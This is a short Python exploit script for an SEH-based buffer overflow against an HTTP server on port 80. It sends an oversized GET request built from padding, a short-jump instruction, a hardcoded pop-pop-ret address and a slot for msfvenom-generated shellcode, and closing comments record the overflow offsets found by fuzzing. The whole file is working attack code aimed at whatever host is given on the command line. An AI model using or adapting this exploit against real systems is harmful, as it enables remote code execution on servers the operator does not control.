#!/usr/bin/python
import socket
import sys

target = sys.argv[1]
port = 80

buf =  ""
<insert msfvenom generated python shellcode>
SHELL = buf

total = 2000
SEH = "\x26\x94\x34\x7c" #pop-pop-ret address, returns us just above SEH
FWD6 = "\xeb\x06\x90\x90" #Jumps (eb) us 6 bytes ahead to get us back over SEH and execute our shell

buffer = "A"*998 + FWD6 + SEH + SHELL
buffer += "D"*(total-len(buffer))

s=socket.socket()
connect=s.connect((target,port))

print "Sending buffer of %d characters..." % len(buffer)
s.send('GET /' + buffer + ' HTTP/1.1\n\n')
s.close()

#Pattern fuzzing Results
#EDX: Points to beginning of GET request ("/")
#ESI: Points to offset 1691
#SEH Handler1: offset 1002
#SEH Handler2: offset 998
